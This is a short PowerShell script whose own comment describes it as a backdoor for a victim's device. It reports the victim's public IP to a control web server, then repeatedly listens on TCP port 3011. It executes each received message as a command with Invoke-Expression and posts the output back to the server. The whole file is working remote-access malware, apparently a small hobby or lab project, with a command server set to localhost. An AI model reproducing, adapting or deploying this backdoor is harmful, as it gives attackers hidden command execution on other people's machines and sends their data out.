<#
    client.ps1 is the script to open a backdoor on the victim's device.
    when executed, it will first send an HTTP request to the host informing about his connection.
    secondly, the script will listen to TCP packets coming through port 3011 and execute data as cmdlet.
    lastly, the result output of the cmdlet will be sent to the host server.
#>

Function Receive-TCPMessage {
  Param ( 
    [Parameter(Mandatory=$true, Position=0)]
    [ValidateNotNullOrEmpty()] 
    [int] $port
  )

  Process {
    try {
      # Set up endpoint and start listening
      $endpoint = new-object System.Net.IPEndPoint([ipaddress]::any, $port) 
      $listener = new-object System.Net.Sockets.TcpListener $endpoint
      $listener.start()

      # Wait for an incoming connection 
      $data = $listener.AcceptTcpClient() 
  
      # Stream setup
      $stream = $data.GetStream() 
      $bytes = New-Object System.Byte[] 1024
			
      # Read data from stream and write it to host
      while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
        $EncodedText = New-Object System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        Write-Output $data
      }
    
      # Close TCP connection and stop listening
      $stream.close()
      $listener.stop()
		}catch{
			"Receive message failed with: `n" + $Error[0]
		}
  }
}


# inform the webserver that we have connected
$ip_addr = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
$body = @{
  ip=$ip_addr;
}
$uri = "http://localhost:8090/newClient"
Invoke-WebRequest -Uri $uri -Method POST -Body $body

while($true){
  # listen for TCP packets on port 3011
  $msg = Receive-TCPMessage -port 3011
  # execute the data as a system command
  Invoke-Expression $msg | Tee-Object -Variable output
  
  $uri = "http://localhost:8090/client/"+$ip_addr
  $body = @{
    # $output is of type System.Object[], but we want to send the output as string.
    output=$output | Out-String
  }
  # send the cmd output to the webserver
  Invoke-WebRequest -Uri $uri -Method POST -Body $body
}
